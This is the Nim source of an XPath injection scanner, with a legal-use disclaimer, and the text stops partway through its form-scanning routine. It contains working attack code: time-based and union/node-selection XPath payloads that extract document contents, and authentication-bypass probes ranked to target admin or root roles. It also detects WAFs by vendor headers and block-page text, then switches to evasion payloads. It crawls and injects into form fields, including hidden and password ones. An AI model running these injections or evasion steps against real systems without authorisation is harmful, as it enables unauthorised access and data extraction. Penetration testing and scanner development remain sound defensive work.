## XPath Injection Scanner - Advanced vulnerability detection tool.
## Coded by Chokri Hammedi (blue0x1).
## Licensed under the MIT License.
## Legal use only: use on systems you own or have explicit permission to test.

import strutils, tables, times
import ../utils/config, ../utils/logger
import http, payloads, analyzer, crawler, extractor

var gWafNoticeShown = false

proc isWafStatus(code: int): bool =
  code == 401 or code == 403 or code == 406 or code == 407 or
  code == 409 or code == 412 or code == 418 or code == 429 or
  code == 501 or code == 503

proc wafEvidence(resp: HttpResponse): seq[string] =
  if isWafStatus(resp.statusCode):
    result.add("HTTP " & $resp.statusCode)
  for k, v in resp.headers:
    let key = k.toLowerAscii()
    let val = v.toLowerAscii()
    if "cloudflare" in key or "cloudflare" in val or key == "cf-ray" or
       key == "cf-cache-status":
      result.add("Cloudflare header")
    if "sucuri" in key or "sucuri" in val:
      result.add("Sucuri header")
    if "akamai" in key or "akamai" in val:
      result.add("Akamai header")
    if "imperva" in key or "incap" in key or "imperva" in val or "incapsula" in val:
      result.add("Imperva/Incapsula header")
    if "mod_security" in key or "modsecurity" in key or
       "mod_security" in val or "modsecurity" in val:
      result.add("ModSecurity header")
    if "waf" in key or "firewall" in key or "blocked" in key:
      result.add("WAF-related header")
  let body = resp.body.toLowerAscii()
  const markers = [
    "access denied", "request blocked", "blocked by", "not acceptable",
    "web application firewall", "waf", "mod_security", "modsecurity",
    "sucuri website firewall", "cloudflare ray id", "attention required",
    "malicious request", "security policy", "forbidden", "bot detection",
    "incapsula", "imperva", "akamai", "barracuda", "wordfence",
    "request rejected", "blocked due to", "attack detected"
  ]
  for marker in markers:
    if marker in body:
      result.add("body marker: " & marker)

proc maybeReportWaf(resp: HttpResponse, context: string) =
  if gWafNoticeShown:
    return
  let evidence = wafEvidence(resp)
  if evidence.len == 0:
    return
  gWafNoticeShown = true
  warn("possible IDS/WAF detected at " & context & ": " & evidence.join(", "))
  warn("switching automatically to encoded/entity/path-breakout bypass payloads")

proc genericErrorContext(baseline, injected: string): string =
  const indicators = ["internal server error", "500 internal", "exception",
                       "stack trace", "error occurred", "unexpected error",
                       "syntax error", "parse error", "query failed"]
  let bodyLow = injected.toLowerAscii()
  for kw in indicators:
    if kw in bodyLow:
      return "Error text found:\n    " & errorSnippet(injected, kw)
  result = diffSnippet(baseline, injected)


type
  VulnType* = enum
    vtError    = "Error-Based"
    vtBoolean  = "Boolean-Based Blind"
    vtTime     = "Time-Based Blind"
    vtUnion    = "Union / Node Selection"
    vtAuth     = "Authentication Bypass"

  Vulnerability* = object
    url*:        string
    parameter*:  string
    vulnType*:   VulnType
    payload*:    string
    confidence*: float
    evidence*:   string
    diffContext*: string
    responseBody*: string

  ScanResult* = object
    target*:       string
    vulns*:        seq[Vulnerability]
    testedParams*: seq[string]
    requestCount*: int
    duration*:     float


proc detectParams*(cfg: ScanConfig): seq[string] =
  if cfg.params.len > 0:
    return cfg.params
  if cfg.httpMethod == hmPost:
    if '*' in cfg.data:
      return @["*"]
    let parsed = parseFormParams(cfg.data)
    for k in parsed.keys:
      result.add(k)
  else:
    let parsed = parseQueryParams(cfg.url)
    for k in parsed.keys:
      result.add(k)
  if result.len == 0:
    warn("No parameters detected. Specify -p <param> or mark injection point with *")


proc scanErrorBased*(cfg: ScanConfig,
                     param: string,
                     queryParams: Table[string, string],
                     baseline: HttpResponse,
                     reqCount: var int): seq[Vulnerability] =
  info("  [E] Error-based detection on param: " & param)
  let payloads = getAllErrorPayloads(cfg.level)

  for pl in payloads:
    inc reqCount
    var resp: HttpResponse
    if cfg.httpMethod == hmPost:
      let body = injectBody(cfg.data, param, pl.value, queryParams)
      resp = sendRequestWithRetry(cfg, bodyOverride = body)
    else:
      let url = injectParam(cfg.url, param, pl.value, queryParams)
      resp = sendRequestWithRetry(cfg, urlOverride = url)

    if resp.err.len > 0:
      debug("    Request error: " & resp.err)
      continue
    maybeReportWaf(resp, "error probe")

    let (errFound, errSig) = detectXpathError(resp.body)
    if errFound:
      success("  [E] XPath error signature found: " & errSig)
      result.add(Vulnerability(
        url:        cfg.url,
        parameter:  param,
        vulnType:   vtError,
        payload:    pl.value,
        confidence: 0.95,
        evidence:   "Error signature: \"" & errSig & "\"",
        diffContext: "Response excerpt:\n    " & errorSnippet(resp.body, errSig),
        responseBody: resp.body
      ))
      return

    let genericErr = detectGenericError(resp.body)
    if genericErr and not responsesAreSimilar(baseline.body, resp.body, 0.85):
      warn("  [E] Generic error detected with response change (confidence: LOW)")
      result.add(Vulnerability(
        url:        cfg.url,
        parameter:  param,
        vulnType:   vtError,
        payload:    pl.value,
        confidence: 0.5,
        evidence:   "Generic server error  |  size: baseline=" & $baseline.body.len & "b  injected=" & $resp.body.len & "b",
        diffContext: genericErrorContext(baseline.body, resp.body),
        responseBody: resp.body
      ))
      return

    debug("    " & pl.desc & " → no error (status " & $resp.statusCode & ")")


proc boolConfidence(trueBody, falseBody, trueBody2, falseBody2: string): float =

  let trueCons  = computeSimilarity(trueBody,  trueBody2).ratio
  let falseCons = computeSimilarity(falseBody, falseBody2).ratio
  let tfSim     = computeSimilarity(trueBody,  falseBody).ratio
  let sizeDelta = abs(trueBody.len - falseBody.len).float /
                  max(max(trueBody.len, falseBody.len), 1).float

  debug("    boolConf: trueCons=" & trueCons.formatFloat(ffDecimal, 3) &
        " falseCons=" & falseCons.formatFloat(ffDecimal, 3) &
        " tf_sim=" & tfSim.formatFloat(ffDecimal, 3) &
        " sizeDelta=" & (sizeDelta * 100).formatFloat(ffDecimal, 1) & "%")

  if trueCons  < 0.92: return 0.0
  if falseCons < 0.92: return 0.0

  if sizeDelta < 0.05 and tfSim > 0.92: return 0.0

  if   tfSim < 0.50 or sizeDelta >= 0.40: result = 0.97
  elif tfSim < 0.65 or sizeDelta >= 0.25: result = 0.90
  elif tfSim < 0.80 or sizeDelta >= 0.12: result = 0.82
  elif tfSim < 0.90 or sizeDelta >= 0.05: result = 0.72
  else: result = 0.0


proc sendInject(cfg: ScanConfig, param, payload: string,
                queryParams: Table[string, string]): HttpResponse =
  if cfg.httpMethod == hmPost:
    sendRequestWithRetry(cfg,
      bodyOverride = injectBody(cfg.data, param, payload, queryParams))
  else:
    sendRequestWithRetry(cfg,
      urlOverride = injectParam(cfg.url, param, payload, queryParams))

proc sendWithParams(cfg: ScanConfig, param, payload: string,
                    params: Table[string, string]): HttpResponse =
  if cfg.httpMethod == hmPost:
    sendRequestWithRetry(cfg,
      bodyOverride = injectBody(cfg.data, param, payload, params))
  else:
    sendRequestWithRetry(cfg,
      urlOverride = injectParam(cfg.url, param, payload, params))

proc preferredAuthPayload(payload: string): bool =
  let p = payload.toLowerAscii()
  result =
    ("contains" in p and
      ("admin" in p or "root" in p or "priv" in p or "owner" in p or
       "manager" in p or "operator" in p or "staff" in p)) or
    "position()=3" in p or "position()=2" in p or "position()=last()" in p

proc orderedAuthPayloads(level: int): seq[Payload] =
  let allPayloads = getAllAuthPayloads(level)
  for pl in allPayloads:
    if preferredAuthPayload(pl.value):
      result.add(pl)
  for pl in allPayloads:
    if not preferredAuthPayload(pl.value):
      result.add(pl)

proc scanAuthBypass*(cfg: ScanConfig,
                     param: string,
                     queryParams: Table[string, string],
                     baseline: HttpResponse,
                     reqCount: var int): seq[Vulnerability] =
  info("  [A] Auth bypass detection on param: " & param)
  let payloads = orderedAuthPayloads(cfg.level)
  var logged = false
  var genericHits = 0

  for pl in payloads:
    inc reqCount
    let resp = sendInject(cfg, param, pl.value, queryParams)
    if resp.err.len > 0:
      debug("    Request error: " & resp.err); continue
    maybeReportWaf(resp, "auth probe")

    let sim       = computeSimilarity(baseline.body, resp.body)
    let sizeDelta = abs(baseline.body.len - resp.body.len).float /
                    max(max(baseline.body.len, resp.body.len), 1).float

    debug("    " & pl.desc & " → sim=" & sim.ratio.formatFloat(ffDecimal, 3) &
          " size_delta=" & (sizeDelta * 100).formatFloat(ffDecimal, 1) & "%")

    if sim.ratio < 0.85 or sizeDelta >= 0.08:
      if not logged or preferredAuthPayload(pl.value):
        success("  [A] Auth bypass confirmed: " & pl.value)
        logged = true
      result.add(Vulnerability(
        url:        cfg.url,
        parameter:  param,
        vulnType:   vtAuth,
        payload:    pl.value,
        confidence: if sizeDelta >= 0.20 or sim.ratio < 0.70: 0.90 else: 0.75,
        evidence:   "Response changed: similarity=" &
                    sim.ratio.formatFloat(ffDecimal, 3) &
                    "  size_delta=" & (sizeDelta * 100).formatFloat(ffDecimal, 1) &
                    "%  baseline=" & $baseline.body.len & "b  injected=" & $resp.body.len & "b",
        diffContext: diffSnippet(baseline.body, resp.body),
        responseBody: resp.body
      ))
      inc genericHits

proc scanBooleanBased*(cfg: ScanConfig,
                       param: string,
                       queryParams: Table[string, string],
                       baseline: HttpResponse,
                       reqCount: var int): seq[Vulnerability] =
  info("  [B] Boolean-based detection on param: " & param)

  inc reqCount
  let baseline2 = sendRequestWithRetry(cfg)
  let stability = computeSimilarity(baseline.body, baseline2.body).ratio
  debug("  [B] Page stability: " & stability.formatFloat(ffDecimal, 3))
  if stability < 0.95:
    warn("  [B] Page is dynamic (stability=" &
         stability.formatFloat(ffDecimal, 3) &
         ") - boolean blind unreliable, skipping")
    return

  let (truePayloads, falsePayloads) = getAllBoolPayloads(cfg.level)

  type Candidate = object
    tpl, fpl:   string
    trueBody:   string
    falseBody:  string
    quickScore: float

  var candidates: seq[Candidate]

  for i in 0 ..< min(truePayloads.len, falsePayloads.len):
    let tpl = truePayloads[i]
    let fpl = falsePayloads[i]

    inc reqCount
    let trueResp = sendInject(cfg, param, tpl.value, queryParams)
    if trueResp.err.len > 0: continue
    maybeReportWaf(trueResp, "boolean TRUE probe")

    inc reqCount
    let falseResp = sendInject(cfg, param, fpl.value, queryParams)
    if falseResp.err.len > 0: continue
    maybeReportWaf(falseResp, "boolean FALSE probe")

    let sim       = computeSimilarity(trueResp.body, falseResp.body)
    let sizeDelta = abs(trueResp.body.len - falseResp.body.len).float /
                    max(max(trueResp.body.len, falseResp.body.len), 1).float

    if sim.ratio >= 0.92 and sizeDelta < 0.05:
      debug("    skip " & tpl.desc & " (tf_sim=" &
            sim.ratio.formatFloat(ffDecimal, 3) & ")")
      continue

    var score = 0.0
    if   sim.ratio < 0.50 or sizeDelta >= 0.40: score = 0.95
    elif sim.ratio < 0.65 or sizeDelta >= 0.25: score = 0.88
    elif sim.ratio < 0.80 or sizeDelta >= 0.12: score = 0.80
    elif sim.ratio < 0.92 or sizeDelta >= 0.05: score = 0.70

    if score > 0.0:
      debug("    candidate: " & tpl.desc &
            " tf_sim=" & sim.ratio.formatFloat(ffDecimal, 3) &
            " size_delta=" & (sizeDelta * 100).formatFloat(ffDecimal, 1) &
            "% quick=" & score.formatFloat(ffDecimal, 2))
      candidates.add(Candidate(tpl: tpl.value, fpl: fpl.value,
                                trueBody: trueResp.body, falseBody: falseResp.body,
                                quickScore: score))

  if candidates.len == 0:
    debug("  [B] No candidate pairs found")
    return

  info("  [B] " & $candidates.len & " candidate(s) to verify")

  var seen: seq[string]

  var verified = 0
  for cand in candidates:
    if cand.tpl in seen: continue
    seen.add(cand.tpl)
    inc verified

    debug("  [B] Verifying: " & cand.tpl[0..min(50, cand.tpl.len-1)])
    inc reqCount
    let trueResp2 = sendInject(cfg, param, cand.tpl, queryParams)
    inc reqCount
    let falseResp2 = sendInject(cfg, param, cand.fpl, queryParams)

    if trueResp2.err.len > 0 or falseResp2.err.len > 0:
      debug("  [B] Verification request failed, skipping")
      continue

    let conf = boolConfidence(cand.trueBody, cand.falseBody,
                              trueResp2.body, falseResp2.body)
    debug("  [B] Conf for [" & cand.tpl[0..min(30, cand.tpl.len-1)] & "]: " &
          conf.formatFloat(ffDecimal, 3) & " (" & confidenceLabel(conf) & ")")

    if conf < 0.72: continue

    let sim       = computeSimilarity(cand.trueBody, cand.falseBody)
    let sizeDelta = abs(cand.trueBody.len - cand.falseBody.len).float /
                    max(max(cand.trueBody.len, cand.falseBody.len), 1).float

    success("  [B] Confirmed: " & cand.tpl & " (" & confidenceLabel(conf) & ")")
    result.add(Vulnerability(
      url:        cfg.url,
      parameter:  param,
      vulnType:   vtBoolean,
      payload:    cand.tpl & " / " & cand.fpl,
      confidence: conf,
      evidence:   "TRUE vs FALSE: similarity=" &
                  sim.ratio.formatFloat(ffDecimal, 3) &
                  "  size_delta=" & (sizeDelta * 100).formatFloat(ffDecimal, 1) &
                  "%  page_stability=" & stability.formatFloat(ffDecimal, 3),
      diffContext: diffSnippet(cand.trueBody, cand.falseBody),
      responseBody: cand.trueBody
    ))


proc scanTimeBased*(cfg: ScanConfig,
                    param: string,
                    queryParams: Table[string, string],
                    baseline: HttpResponse,
                    reqCount: var int): seq[Vulnerability] =
  info("  [T] Time-based detection on param: " & param)

  let heavyPayloads = @[
    "' or count(//*)>0 and count(//*)=count(//*) or '",
    "' or string-length(string(/*))>0 or '",
    "' or translate(string(/*),string(/*),string(/*))='' or '",
    "' or count((//.)[count((//.))]) and '1'='1",
    "' or count((//.)[count((//.)[count((//.))])]) and '1'='1",
    "') or (count((//.)[count((//.))])) or ('1'='1",
    "')) or ((count((//.)[count((//.))]))) or (('1'='1",
  ]

  var totalBaseline = baseline.elapsed
  var baselineSamples = 1

  for _ in 0..1:
    inc reqCount
    let r = sendRequestWithRetry(cfg)
    if r.err.len == 0:
      totalBaseline += r.elapsed
      inc baselineSamples
  let avgBaseline = totalBaseline / baselineSamples.float

  for pl in heavyPayloads:
    inc reqCount
    var resp: HttpResponse
    if cfg.httpMethod == hmPost:
      resp = sendRequestWithRetry(cfg,
        bodyOverride = injectBody(cfg.data, param, pl, queryParams))
    else:
      resp = sendRequestWithRetry(cfg,
        urlOverride = injectParam(cfg.url, param, pl, queryParams))

    if resp.err.len > 0: continue
    maybeReportWaf(resp, "time probe")

    let delta = resp.elapsed - avgBaseline
    debug("    Timing: baseline=" & avgBaseline.formatFloat(ffDecimal, 3) &
          "s injected=" & resp.elapsed.formatFloat(ffDecimal, 3) &
          "s delta=" & delta.formatFloat(ffDecimal, 3) & "s")

    if isTimingAnomaly(avgBaseline, resp.elapsed, cfg.timingThreshold):
      success("  [T] Timing anomaly detected! delta=" &
              delta.formatFloat(ffDecimal, 2) & "s")
      result.add(Vulnerability(
        url:        cfg.url,
        parameter:  param,
        vulnType:   vtTime,
        payload:    pl,
        confidence: 0.7,
        evidence:   "Response delta: " & delta.formatFloat(ffDecimal, 2) &
                    "s (baseline: " & avgBaseline.formatFloat(ffDecimal, 2) & "s)",
        diffContext: diffSnippet(baseline.body, resp.body),
        responseBody: resp.body
      ))
      return


proc scanUnionBased*(cfg: ScanConfig,
                     param: string,
                     queryParams: Table[string, string],
                     baseline: HttpResponse,
                     reqCount: var int): seq[Vulnerability] =
  info("  [U] Union/node-selection detection on param: " & param)

  let original =
    if param in queryParams: queryParams[param]
    else: ""
  let selector = if original.len > 0: original else: "text()"
  let falseValues = @[
    "__xpath_no_match__",
    "') and ('1'='2",
  ]
  let probes = @[
    "//text()",
    "/*//text()",
    "../../..//text()",
    "../..//text()",
    "..//text()",
    "ancestor-or-self::*//text()",
    "/*[1]",
    "/*[1]/*[1]",
    "/*[1]/*[1]/*[1]",
    "/*[1]/*[1]/*[1]/*[1]",
    "/*[1]/*[1]/*[1]/*[1]/*[1]",
    "/*[1]/*[2]",
    "/*[1]/*[2]/*[1]",
    "/*[1]/*[2]/*[1]/*[1]",
    "/*[1]/*[2]/*[1]/*[1]/*[1]",
    "/*[1]/*[2]/*[2]/*[1]/*[1]",
    "/*[1]/*[2]/*[3]/*[1]/*[1]",
    "/*[1]/*[2]/*[3]/*[1]/*[3]",
    "//@*",
    "//*/@*",
    "//comment()",
    "//processing-instruction()",
  ]

  var contexts: seq[tuple[name: string, params: Table[string, string], baseline: HttpResponse]]
  contexts.add((name: "original", params: queryParams, baseline: baseline))
  var seenPayloads: seq[string]

  for falseValue in falseValues:
    var params = queryParams
    var changed = false
    for k in queryParams.keys:
      if k != param:
        params[k] = falseValue
        changed = true
    if changed:
      inc reqCount
      let baseResp = sendWithParams(cfg, param, selector, params)
      if baseResp.err.len == 0:
        contexts.add((name: "suppressed sibling params", params: params, baseline: baseResp))

  for ctxInfo in contexts:
    for path in probes:
      let payload = selector & "|" & path
      inc reqCount
      let resp = sendWithParams(cfg, param, payload, ctxInfo.params)
      if resp.err.len > 0:
        debug("    Request error: " & resp.err)
        continue
      maybeReportWaf(resp, "union probe")

      let visibleNew = visibleDelta(ctxInfo.baseline.body, resp.body)
      if visibleNew.len == 0:
        debug("    skip " & payload & " because response change has no new visible data")
        continue

      let sim = computeSimilarity(ctxInfo.baseline.body, resp.body)
      let sizeDelta = abs(ctxInfo.baseline.body.len - resp.body.len).float /
                      max(max(ctxInfo.baseline.body.len, resp.body.len), 1).float

      debug("    [" & ctxInfo.name & "] " & payload & " → sim=" &
            sim.ratio.formatFloat(ffDecimal, 3) &
            " size_delta=" & (sizeDelta * 100).formatFloat(ffDecimal, 1) & "%")

      if sim.ratio < 0.98 or sizeDelta >= 0.005:
        if payload in seenPayloads:
          continue
        seenPayloads.add(payload)
        success("  [U] Node-selection union changed response: " & payload)
        let unionConfidence =
          if sim.ratio < 0.70 or sizeDelta >= 0.20: 0.90
          elif sim.ratio < 0.88 or sizeDelta >= 0.05: 0.75
          else: 0.65
        result.add(Vulnerability(
          url:        cfg.url,
          parameter:  param,
          vulnType:   vtUnion,
          payload:    payload,
          confidence: unionConfidence,
          evidence:   "Unioned XPath selector changed response: similarity=" &
                      sim.ratio.formatFloat(ffDecimal, 3) &
                      "  size_delta=" & (sizeDelta * 100).formatFloat(ffDecimal, 1) &
                      "%  path=" & path & "  context=" & ctxInfo.name,
          diffContext: diffSnippet(ctxInfo.baseline.body, resp.body),
          responseBody: resp.body
        ))
        if result.len >= 30:
          warn("  [U] Reached union finding cap; stopping union probes for this parameter")
          return


proc normalizedFormDefaults(form: DetectedForm): DetectedForm =
  result = form
  for i in 0 ..< result.fields.len:
    if result.fields[i].value.len > 0:
      continue
    case result.fields[i].kind
    of fkText, fkPassword, fkSearch, fkTextarea:
      result.fields[i].value = "xpathscan"
    of fkSelect, fkRadio, fkCheckbox:
      result.fields[i].value = "1"
    else:
      discard

proc formParamTable(form: DetectedForm): Table[string, string] =
  let prepared = normalizedFormDefaults(form)
  let encoded =
    if prepared.httpMethod == hmPost:
      formToPostBody(prepared, "", "")
    else:
      let url = formToGetUrl(prepared, "", "")
      let q = url.find('?')
      if q >= 0: url[q + 1 .. ^1] else: ""
  result = parseFormParams(encoded)

proc scanFormUnionBased(cfg: ScanConfig,
                        form: DetectedForm,
                        field: FormField,
                        baseline: HttpResponse,
                        reqCount: var int): seq[Vulnerability] =
  var formCfg = cfg
  formCfg.httpMethod = form.httpMethod
  formCfg.followRedirects = false

  let prepared = normalizedFormDefaults(form)
  if form.httpMethod == hmPost:
    formCfg.url = form.action
    formCfg.data = formToPostBody(prepared, "", "")
  else:
    formCfg.url = formToGetUrl(prepared, "", "")

  let params = formParamTable(prepared)
  result = scanUnionBased(formCfg, field.name, params, baseline, reqCount)

proc sendFormRequest(cfg: ScanConfig,
                     form: DetectedForm,
                     fieldName: string,
                     payload: string): HttpResponse =
  var formCfg = cfg
  formCfg.httpMethod = form.httpMethod
  formCfg.followRedirects = false
  let preparedForm = normalizedFormDefaults(form)
  if form.httpMethod == hmPost:
    let body = formToPostBody(preparedForm, fieldName, payload)
    result = sendRequestWithRetry(formCfg, urlOverride = form.action,
                                  bodyOverride = body)
  else:
    let url = formToGetUrl(preparedForm, fieldName, payload)
    result = sendRequestWithRetry(formCfg, urlOverride = url)

proc scanFormErrorBased(cfg: ScanConfig,
                        form: DetectedForm,
                        field: FormField,
                        baseline: HttpResponse,
                        reqCount: var int): seq[Vulnerability] =
  let errorPayloads = getAllErrorPayloads(cfg.level)
  for pl in errorPayloads:
    inc reqCount
    let resp = sendFormRequest(cfg, form, field.name, pl.value)
    if resp.err.len > 0:
      debug("    Request error: " & resp.err); continue
    maybeReportWaf(resp, "form error probe")

    let (errFound, errSig) = detectXpathError(resp.body)
    if errFound:
      success("  [E] XPath error signature found: " & errSig)
      result.add(Vulnerability(
        url:        form.action,
        parameter:  field.name,
        vulnType:   vtError,
        payload:    pl.value,
        confidence: 0.95,
        evidence:   "Error signature: \"" & errSig & "\"",
        diffContext: "Response excerpt:\n    " & errorSnippet(resp.body, errSig),
        responseBody: resp.body
      ))
      return

    let genericErr = detectGenericError(resp.body)
    if genericErr and not responsesAreSimilar(baseline.body, resp.body, 0.85):
      result.add(Vulnerability(
        url:        form.action,
        parameter:  field.name,
        vulnType:   vtError,
        payload:    pl.value,
        confidence: 0.5,
        evidence:   "Generic server error  |  size: baseline=" & $baseline.body.len & "b  injected=" & $resp.body.len & "b",
        diffContext: genericErrorContext(baseline.body, resp.body),
        responseBody: resp.body
      ))
      return
    debug("    " & pl.desc & " → no error (status " & $resp.statusCode & ")")

proc scanFormAuthBypass(cfg: ScanConfig,
                        form: DetectedForm,
                        field: FormField,
                        baseline: HttpResponse,
                        reqCount: var int): seq[Vulnerability] =
  let payloads = orderedAuthPayloads(cfg.level)
  var logged = false
  var genericHits = 0
  for pl in payloads:
    inc reqCount
    let resp = sendFormRequest(cfg, form, field.name, pl.value)
    if resp.err.len > 0: continue
    maybeReportWaf(resp, "form auth probe")

    let sim       = computeSimilarity(baseline.body, resp.body)
    let sizeDelta = abs(baseline.body.len - resp.body.len).float /
                    max(max(baseline.body.len, resp.body.len), 1).float

    debug("    [A] " & pl.desc & " → sim=" & sim.ratio.formatFloat(ffDecimal, 3) &
          " size_delta=" & (sizeDelta * 100).formatFloat(ffDecimal, 1) & "%")

    if sim.ratio < 0.85 or sizeDelta >= 0.08:
      if not logged or preferredAuthPayload(pl.value):
        success("  [A] Auth bypass confirmed: " & pl.value)
        logged = true
      result.add(Vulnerability(
        url:        form.action,
        parameter:  field.name,
        vulnType:   vtAuth,
        payload:    pl.value,
        confidence: if sizeDelta >= 0.20 or sim.ratio < 0.70: 0.90 else: 0.75,
        evidence:   "Response changed: similarity=" &
                    sim.ratio.formatFloat(ffDecimal, 3) &
                    "  size_delta=" & (sizeDelta * 100).formatFloat(ffDecimal, 1) &
                    "%  baseline=" & $baseline.body.len & "b  injected=" & $resp.body.len & "b",
        diffContext: diffSnippet(baseline.body, resp.body),
        responseBody: resp.body
      ))
      inc genericHits

proc scanFormBooleanBased(cfg: ScanConfig,
                          form: DetectedForm,
                          field: FormField,
                          baseline: HttpResponse,
                          reqCount: var int): seq[Vulnerability] =
  inc reqCount
  let baseline2 = sendFormRequest(cfg, form, field.name, field.value)
  if baseline2.err.len > 0:
    debug("  [B] Stability request failed"); return
  let stability = computeSimilarity(baseline.body, baseline2.body).ratio
  debug("  [B] Page stability: " & stability.formatFloat(ffDecimal, 3))
  if stability < 0.95:
    warn("  [B] Page is dynamic (stability=" &
         stability.formatFloat(ffDecimal, 3) &
         ") - boolean blind unreliable, skipping")
    return

  let (truePayloads, falsePayloads) = getAllBoolPayloads(cfg.level)

  type Candidate = object
    tpl, fpl:   string
    trueBody:   string
    falseBody:  string
    quickScore: float

  var candidates: seq[Candidate]

  for i in 0 ..< min(truePayloads.len, falsePayloads.len):
    let tpl = truePayloads[i]
    let fpl = falsePayloads[i]

    inc reqCount
    let trueResp = sendFormRequest(cfg, form, field.name, tpl.value)
    if trueResp.err.len > 0: continue
    maybeReportWaf(trueResp, "form boolean TRUE probe")

    inc reqCount
    let falseResp = sendFormRequest(cfg, form, field.name, fpl.value)
    if falseResp.err.len > 0: continue
    maybeReportWaf(falseResp, "form boolean FALSE probe")

    let sim       = computeSimilarity(trueResp.body, falseResp.body)
    let sizeDelta = abs(trueResp.body.len - falseResp.body.len).float /
                    max(max(trueResp.body.len, falseResp.body.len), 1).float

    if sim.ratio >= 0.92 and sizeDelta < 0.05:
      debug("    skip " & tpl.desc & " (tf_sim=" &
            sim.ratio.formatFloat(ffDecimal, 3) & ")")
      continue

    var score = 0.0
    if   sim.ratio < 0.50 or sizeDelta >= 0.40: score = 0.95
    elif sim.ratio < 0.65 or sizeDelta >= 0.25: score = 0.88
    elif sim.ratio < 0.80 or sizeDelta >= 0.12: score = 0.80
    elif sim.ratio < 0.92 or sizeDelta >= 0.05: score = 0.70

    if score > 0.0:
      debug("    candidate: " & tpl.desc &
            " tf_sim=" & sim.ratio.formatFloat(ffDecimal, 3) &
            " size_delta=" & (sizeDelta * 100).formatFloat(ffDecimal, 1) &
            "% quick=" & score.formatFloat(ffDecimal, 2))
      candidates.add(Candidate(tpl: tpl.value, fpl: fpl.value,
                                trueBody: trueResp.body, falseBody: falseResp.body,
                                quickScore: score))

  if candidates.len == 0:
    debug("  [B] No candidate pairs found"); return

  info("  [B] " & $candidates.len & " candidate(s) to verify")

  var seen: seq[string]

  var verified = 0
  for cand in candidates:
    if cand.tpl in seen: continue
    seen.add(cand.tpl)
    inc verified

    debug("  [B] Verifying: " & cand.tpl[0..min(50, cand.tpl.len-1)])
    inc reqCount
    let trueResp2 = sendFormRequest(cfg, form, field.name, cand.tpl)
    inc reqCount
    let falseResp2 = sendFormRequest(cfg, form, field.name, cand.fpl)

    if trueResp2.err.len > 0 or falseResp2.err.len > 0:
      debug("  [B] Verification request failed, skipping"); continue

    let conf = boolConfidence(cand.trueBody, cand.falseBody,
                              trueResp2.body, falseResp2.body)
    debug("  [B] Conf for [" & cand.tpl[0..min(30, cand.tpl.len-1)] & "]: " &
          conf.formatFloat(ffDecimal, 3) & " (" & confidenceLabel(conf) & ")")

    if conf < 0.72: continue

    let sim       = computeSimilarity(cand.trueBody, cand.falseBody)
    let sizeDelta = abs(cand.trueBody.len - cand.falseBody.len).float /
                    max(max(cand.trueBody.len, cand.falseBody.len), 1).float

    success("  [B] Confirmed: " & cand.tpl & " (" & confidenceLabel(conf) & ")")
    result.add(Vulnerability(
      url:        form.action,
      parameter:  field.name,
      vulnType:   vtBoolean,
      payload:    cand.tpl & " / " & cand.fpl,
      confidence: conf,
      evidence:   "TRUE vs FALSE: similarity=" &
                  sim.ratio.formatFloat(ffDecimal, 3) &
                  "  size_delta=" & (sizeDelta * 100).formatFloat(ffDecimal, 1) &
                  "%  page_stability=" & stability.formatFloat(ffDecimal, 3),
      diffContext: diffSnippet(cand.trueBody, cand.falseBody),
      responseBody: cand.trueBody
    ))

proc scanFormTimeBased(cfg: ScanConfig,
                       form: DetectedForm,
                       field: FormField,
                       baseline: HttpResponse,
                       reqCount: var int): seq[Vulnerability] =
  let heavyPayloads = @[
    "' or count(//*)>0 and count(//*)=count(//*) or '",
    "' or string-length(string(/*))>0 or '",
    "' or count((//.)[count((//.))]) and '1'='1",
    "' or count((//.)[count((//.)[count((//.))])]) and '1'='1",
    "') or (count((//.)[count((//.))])) or ('1'='1",
  ]
  var totalBaseline = baseline.elapsed
  var baselineSamples = 1
  for _ in 0..1:
    inc reqCount
    let r = sendFormRequest(cfg, form, field.name, field.value)
    if r.err.len == 0:
      totalBaseline += r.elapsed; inc baselineSamples
  let avgBaseline = totalBaseline / baselineSamples.float

  for pl in heavyPayloads:
    inc reqCount
    let resp = sendFormRequest(cfg, form, field.name, pl)
    if resp.err.len > 0: continue
    maybeReportWaf(resp, "form time probe")
    let delta = resp.elapsed - avgBaseline
    debug("    Timing: base=" & avgBaseline.formatFloat(ffDecimal, 3) &
          "s injected=" & resp.elapsed.formatFloat(ffDecimal, 3) &
          "s delta=" & delta.formatFloat(ffDecimal, 3) & "s")
    if isTimingAnomaly(avgBaseline, resp.elapsed, cfg.timingThreshold):
      success("  [T] Timing anomaly detected! delta=" &
              delta.formatFloat(ffDecimal, 2) & "s")
      result.add(Vulnerability(
        url:        form.action,
        parameter:  field.name,
        vulnType:   vtTime,
        payload:    pl,
        confidence: 0.7,
        evidence:   "Response delta: " & delta.formatFloat(ffDecimal, 2) &
                    "s (baseline: " & avgBaseline.formatFloat(ffDecimal, 2) & "s)",
        diffContext: diffSnippet(baseline.body, resp.body),
        responseBody: resp.body
      ))
      return

proc scanForm*(cfg: ScanConfig,
               form: DetectedForm,
               formIdx: int,
               result: var ScanResult) =
  info("Scanning form #" & $formIdx & "  [" & $form.httpMethod & "]  " & form.action)

  inc result.requestCount
  var formCfg = cfg
  formCfg.httpMethod = form.httpMethod
  formCfg.followRedirects = false
  let preparedForm = normalizedFormDefaults(form)
  var baselineUrl = form.action
  var baselineBody = ""
  if form.httpMethod == hmPost:
    baselineBody = formToPostBody(preparedForm, "", "")
  else:
    baselineUrl = formToGetUrl(preparedForm, "", "")

  let baseline = sendRequestWithRetry(formCfg,
    urlOverride  = baselineUrl,
    bodyOverride = baselineBody)

  if baseline.err.len > 0:
    error("Cannot reach form action URL: " & baseline.err)
    return
  info("  Baseline: HTTP " & $baseline.statusCode &
       " | " & $baseline.body.len & " bytes")

  let testableKinds = {
    fkText, fkPassword, fkHidden, fkSearch, fkTextarea,
    fkSelect, fkRadio, fkCheckbox
  }
  var testedAny = false
  for field in form.fields:
    if field.kind notin testableKinds: continue
    testedAny = true
    let kindTag = case field.kind
      of fkHidden:   " (hidden)"
      of fkPassword: " (password)"
      of fkSelect:   " (select)"
      of fkRadio:    " (radio)"
      of fkCheckbox: " (checkbox)"
      of fkTextarea: " (textarea)"
      else: ""
    info("  Testing field: [" & field.name & "]" & kindTag)
    result.testedParams.add(field.name)

    if techError in cfg.techniques:
      result.vulns.add(
        scanFormErrorBased(cfg, form, field, baseline, result.requestCount))

    if techAuth in cfg.techniques:
      result.vulns.add(scanFormAuthBypass(cfg, form, field, baseline, result.requestCount))

    if techBoolean in cfg.techniques:
      result.vulns.add(
        scanFormBooleanBased(cfg, form, field, baseline, result.requestCount))

    if techUnion in cfg.techniques:
      result.vulns.add(
